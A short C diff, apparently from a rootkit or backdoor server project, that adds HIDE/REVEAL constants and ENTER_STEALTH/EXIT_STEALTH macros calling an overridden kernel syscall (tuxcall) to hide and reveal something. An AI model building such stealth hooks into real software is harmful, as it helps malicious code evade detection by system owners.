@@ -6,7 +6,11 @@
 #define BACKLOG_SIZE 5
 #define DISCONNECT_MSG "disconnect"
 #define SHUTDOWN_MSG "shutdown"
-#define ENTER_STEALTH(x) (syscall(__NR_tuxcall, x))
+#define HIDE 0
+#define REVEAL 1
+#define OVERRIDDEN_SYSCALL __NR_tuxcall
+#define ENTER_STEALTH(x) (syscall(OVERRIDDEN_SYSCALL, x, HIDE))
+#define EXIT_STEALTH(x) (syscall(OVERRIDDEN_SYSCALL, x, REVEAL))
 
 #include <stdio.h>
 #include <stdlib.h>
